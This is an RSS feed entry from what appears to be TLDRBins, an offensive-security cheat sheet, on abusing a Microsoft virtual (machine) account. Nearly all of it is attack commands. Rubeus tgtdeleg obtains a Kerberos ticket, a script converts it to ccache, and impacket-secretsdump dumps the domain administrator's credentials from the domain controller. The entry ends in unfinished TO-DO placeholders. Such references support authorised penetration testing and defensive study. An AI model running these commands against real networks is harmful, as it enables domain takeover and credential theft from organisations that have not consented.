channel.title: Microsoft Virtual Account on TLDRBins
channel.description: Recent content in Microsoft Virtual Account on TLDRBins

item.title: Machine Account
item.description: Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 1. Convert kirbi to ccache python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache 2. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache 1. TO-DO TO-DO
